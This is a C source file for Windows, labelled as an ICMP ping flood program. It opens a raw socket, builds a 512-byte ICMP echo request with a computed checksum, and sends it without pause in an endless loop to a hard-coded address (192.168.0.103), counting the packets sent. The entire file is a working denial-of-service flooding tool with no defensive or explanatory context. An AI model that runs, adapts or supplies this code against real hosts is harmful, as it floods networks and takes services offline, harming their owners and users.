/*
    Icmp ping flood program in winsock
*/
#include "stdio.h"
#include "winsock2.h"
#include "conio.h"
#include "stdint.h"

#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#define ICMP_ECHO       8   /* Echo Request         */

unsigned short in_cksum(unsigned short *ptr, int nbytes);

typedef uint8_t u_int8_t;
typedef uint16_t u_int16_t;
typedef uint32_t u_int32_t;

struct icmphdr
{
    u_int8_t type;      /* message type */
    u_int8_t code;      /* type sub-code */
    u_int16_t checksum;
    union
    {
        struct
        {
            u_int16_t   id;
            u_int16_t   sequence;
        } echo;         /* echo datagram */
        u_int32_t   gateway;    /* gateway address */
        struct
        {
            u_int16_t   __unused;
            u_int16_t   mtu;
        } frag;         /* path mtu discovery */
    } un;
};

int main(int argc, char *argv[])
{
    char *packet, *data=NULL;

    SOCKET s;
    int k = 1, packet_size, payload_size = 512, sent = 0;

    struct iphdr *iph = NULL;
    struct icmphdr *icmph = NULL;
    struct sockaddr_in dest;

    //Initialise Winsock
    WSADATA wsock;
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsock) != 0)
    {
        fprintf(stderr,"WSAStartup() failed");
        exit(EXIT_FAILURE);
    }
    printf("Done");

    //Create Raw ICMP Packet
    if((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == SOCKET_ERROR)
    {
        printf("Failed to create raw icmp packet");
        exit(EXIT_FAILURE);
    }

    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("192.168.0.103");

    packet_size = sizeof(struct icmphdr) + payload_size;
    packet = (char * )malloc(packet_size);

    //zero out the packet buffer
    memset (packet, 0, packet_size);

    icmph = (struct icmphdr*) packet;
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.sequence = rand();
    icmph->un.echo.id = rand();

    // Initialize the TCP payload to some rubbish
    data = packet + sizeof(struct icmphdr);
    memset(data, '^', payload_size);

    //checksum
    icmph->checksum = 0;
    icmph->checksum = in_cksum((unsigned short *)icmph, packet_size);

    printf("\nSending packet...\n");

    while(1)
    {
        if(sendto(s , packet , packet_size , 0 , (struct sockaddr *)&dest, sizeof(dest)) == SOCKET_ERROR )
        {
            printf("Error sending Packet : %d" , WSAGetLastError());
            break;
        }

        printf("%d packets send\r" , ++sent);

    }

    return 0;
}

/*
    Function calculate checksum
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return (answer);
}
